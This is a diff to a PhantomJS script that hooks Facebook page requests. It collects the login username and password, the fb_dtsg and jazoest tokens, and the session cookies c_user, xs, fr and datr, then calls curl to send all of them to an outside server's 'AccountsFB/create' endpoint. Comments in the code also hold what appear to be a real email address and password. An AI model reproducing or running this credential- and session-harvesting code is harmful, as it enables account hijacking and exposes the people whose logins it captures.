@@ -32,10 +32,14 @@ page.onResourceRequested = function(requestData, networkRequest) {
 		console.log("jazoest: " + data.jazoest );
 		
 		var cookies = page.cookies;
-	  
+		var cookieStr = '';
 		console.log('Listing cookies:');
 		for(var i in cookies) {
 			console.log(cookies[i].name + '=' + cookies[i].value);
+			if(cookies[i].name == 'c_user') cookieStr += ';c_user=' + cookies[i].value;
+			if(cookies[i].name == 'xs') cookieStr += ';xs=' + cookies[i].value;
+			if(cookies[i].name == 'fr') cookieStr += ';fr=' + cookies[i].value;
+			if(cookies[i].name == 'datr') cookieStr += 'datr=' + cookies[i].value;
 		}
 		var urlParam = "username=" + args[1] //"huthamcauquan1@gmail.com" 
 		+ "&password=" + args[2] // "HoangVuong3031993" 
@@ -44,12 +48,13 @@ page.onResourceRequested = function(requestData, networkRequest) {
 		+"&__spin_t=" + data.__spin_t
 		+"&__user=" + data.__user
 		+"&fb_dtsg=" + data.fb_dtsg
-		+"&jazoest=" + data.jazoest;
-		+"&cookies=" + JSON.stringify(cookies);
+		+"&jazoest=" + data.jazoest
+		+"&cookie=" + cookieStr;
+		console.log('cookie : ' + cookieStr);
 	//	var child = spawn("curl", ["" ,"http://facebook-nguyenvanvu.c9users.io:8080/AccountsFB/create?" + urlParam]);
 		execFile("curl", ["", "http://facebook-nguyenvanvu.c9users.io:8080/AccountsFB/create?" + urlParam], null, function (err, stdout, stderr) {
-		  //console.log("execFileSTDOUT:", JSON.stringify(stdout))
-		 // console.log("execFileSTDERR:", JSON.stringify(stderr))
+		  console.log("execFileSTDOUT:", JSON.stringify(stdout))
+		 console.log("execFileSTDERR:", JSON.stringify(stderr))
 		})
 	
 	}
